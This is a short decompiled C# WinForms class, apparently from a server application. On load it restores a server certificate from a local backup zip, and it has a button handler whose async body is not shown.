using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Windows.Forms;
using Siticone.Desktop.UI.WinForms;

namespace Server.Forms
{
	// Token: 0x0200009C RID: 156
	public partial class FormCertificate : Form
	{
		// Token: 0x060004C4 RID: 1220 RVA: 0x00004862 File Offset: 0x00002A62
		public FormCertificate()
		{
			this.InitializeComponent();
		}

		// Token: 0x060004C5 RID: 1221 RVA: 0x0003CC4C File Offset: 0x0003AE4C
		private void FormCertificate_Load(object sender, EventArgs e)
		{
			try
			{
				string text = Application.StartupPath + "\\BackupCertificate.zip";
				if (File.Exists(text))
				{
					MessageBox.Show(this, "Found a zip backup, Extracting (BackupCertificate.zip)", "Certificate backup", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					ZipFile.ExtractToDirectory(text, Application.StartupPath);
					Settings.ServerCertificate = new X509Certificate2(Settings.CertificatePath);
					base.Close();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, ex.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
		}

		// Token: 0x060004C6 RID: 1222 RVA: 0x0003CCD0 File Offset: 0x0003AED0
		private void Button1_Click(object sender, EventArgs e)
		{
			FormCertificate.<Button1_Click>d__2 <Button1_Click>d__;
			<Button1_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<Button1_Click>d__.<>4__this = this;
			<Button1_Click>d__.<>1__state = -1;
			<Button1_Click>d__.<>t__builder.Start<FormCertificate.<Button1_Click>d__2>(ref <Button1_Click>d__);
		}
	}
}
